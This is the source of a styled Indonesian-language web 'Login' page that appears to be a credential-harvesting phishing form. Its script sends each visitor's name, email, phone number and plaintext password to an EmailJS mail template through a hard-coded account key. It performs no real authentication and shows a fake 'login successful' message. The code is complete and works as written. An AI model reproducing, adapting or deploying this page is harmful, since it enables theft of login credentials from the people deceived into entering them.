<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Login</title>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
(function(){
  emailjs.init('ro708R9ZDL1kfLuiC');
})();
</script>

<style>
body {
  font-family: system-ui, Segoe UI, Roboto, Arial;
  margin: 0;
  padding: 10px;
  background: #0a0a0a url('aset/background.jpg') no-repeat center center fixed;
  background-size: cover;
  color: #fff;

  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

/* CARD */
.card {
  width: 100%;
  max-width: 500px;
  padding: 20px;
  border-radius: 18px;
  background: url('aset/card.jpg') center/cover no-repeat;
  box-shadow: 0 0 40px rgba(0,0,0,0.5);
  position: relative;
}

/* overlay */
.card::after {
  content: "";
  position: absolute;
  inset: 0;
  background: rgba(0, 0, 0, 0.6);
  border-radius: 18px;
  z-index: 0;
}

/* neon border */
.card::before {
  content: "";
  position: absolute;
  inset: 0;
  border-radius: 18px;
  padding: 2px;
  background: linear-gradient(120deg,#00ffff,#00ff80,#ffff00,#ff00ff,#00ffff);
  background-size: 400% 400%;
  animation: neonmove 6s linear infinite;
  -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
  -webkit-mask-composite: xor;
  z-index: 1;
}

/* isi di atas overlay */
.card * {
  position: relative;
  z-index: 2;
}

@keyframes neonmove {
  0%{background-position:0% 50%}
  50%{background-position:100% 50%}
  100%{background-position:0% 50%}
}

h1 {
  margin-top: 0;
  font-size: 26px;
}

label {
  display: block;
  margin: 10px 0 6px;
  font-weight: 600;
}

/* INPUT */
input {
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: none;
  background: rgba(255,255,255,0.15);
  color: #fff;
  font-size: 14px;
}

/* GRID */
.row {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}

/* RESPONSIVE */
@media (max-width: 480px) {
  .row {
    grid-template-columns: 1fr;
  }

  h1 {
    font-size: 22px;
  }
}

/* BUTTON */
button {
  width: 100%;
  margin-top: 12px;
  padding: 12px;
  border-radius: 10px;
  border: none;
  background: #0b69ff;
  color: #fff;
  font-size: 16px;
  cursor: pointer;
}

/* STATUS */
.success, .error {
  padding: 10px;
  margin-top: 12px;
  border-radius: 8px;
}

.success { background: rgba(0,255,150,0.25); }
.error { background: rgba(255,80,80,0.25); }
</style>
</head>

<body>

<div id="login" class="card">
  <h1>Login</h1>

  <form id="memberForm">
    <div class="row">
      <div>
        <label>Nama Lengkap</label>
        <input id="fullname" required />
      </div>
      <div>
        <label>Email</label>
        <input id="email" type="email" required />
      </div>
    </div>

    <label>No HP</label>
    <input id="phone" />

    <label>Password</label>
    <input id="password" type="password" required />

    <div style="margin-top:6px">
      <input id="showPwd" type="checkbox"> Tampilkan Password
    </div>

    <button type="submit">Kirim</button>
    <div id="status"></div>
  </form>
</div>

<div id="home" style="display:none; text-align:center;">
  <h2>Berhasil Login 🎉</h2>
</div>

<script>
// show password
document.getElementById('showPwd').addEventListener('change', function(){
  password.type = this.checked ? 'text' : 'password';
});

const form = document.getElementById('memberForm');
const statusEl = document.getElementById('status');

form.addEventListener('submit', function(e){
  e.preventDefault();

  const btn = form.querySelector("button");
  btn.disabled = true;

  statusEl.innerHTML = '<div class="success">⏳ Mengirim...</div>';

  const params = {
    fullname: fullname.value.trim(),
    email: email.value.trim(),
    phone: phone.value.trim(),
    password: password.value
  };

  if(!params.fullname || !params.email || !params.password){
    statusEl.innerHTML = '<div class="error">Harap isi semua data wajib!</div>';
    btn.disabled = false;
    return;
  }

  emailjs.send("service_Dril054", "template_drilweb054", params)
  .then(function(){
    statusEl.innerHTML = '<div class="success">✅ Login berhasil!</div>';

    setTimeout(()=>{
      login.style.display='none';
      home.style.display='block';
    },1000);

    btn.disabled = false;
  })
  .catch(function(err){
    console.log(err);
    statusEl.innerHTML = '<div class="error">❌ Gagal: cek EmailJS</div>';
    btn.disabled = false;
  });
});
</script>

</body>
</html>
